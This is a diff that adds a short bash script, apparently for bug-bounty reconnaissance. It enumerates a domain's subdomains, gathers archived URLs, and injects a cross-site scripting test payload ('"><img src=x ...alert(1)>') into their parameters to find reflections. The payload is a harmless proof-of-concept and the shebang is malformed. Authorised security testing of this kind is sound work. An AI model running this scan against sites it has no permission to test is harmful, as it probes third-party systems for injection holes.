@@ -1,0 +1,21 @@
+#!usr/bin/bash
+
+echo " My script ";
+
+read -p "Enter domain name => " input
+for i in ${input[@]}
+do
+echo "
+.
+.
+.
+scan started for $i
+"
+
+mkdir bugs/$i
+subfinder -d $i | httpx >> bugs/$i/subdomains.txt
+
+cat bugs/$i/subdomains.txt | waybackurls | gf xss | uro | qsreplace '"><img src=x on error=alert(1);>'|freq
+echo "done"
+
+done
